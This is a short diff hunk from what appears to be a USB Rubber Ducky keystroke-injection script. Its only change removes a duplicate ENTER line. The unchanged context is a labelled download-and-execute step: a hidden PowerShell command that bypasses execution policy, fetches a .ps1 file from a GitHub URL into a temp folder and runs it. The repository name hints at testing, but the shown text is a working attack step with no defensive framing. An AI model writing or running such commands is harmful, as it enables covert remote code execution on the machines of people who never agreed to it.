@@ -38,5 +38,4 @@ REM *** Download and execute the payload ***
 
 STRING powershell -NoP -NonI -W h -Exec Bypass md "$env:userprofile\temp"; iwr "https://github.com/Dev-Sadwhite/Rubber-Test/blob/main/payloads-download/windows/1.ps1"  -outfile "$env:userprofile\temp\1.ps1"; cd $env:userprofile\temp; sleep 5; & .\1.ps1
 ENTER
-ENTER
 DELAY 100
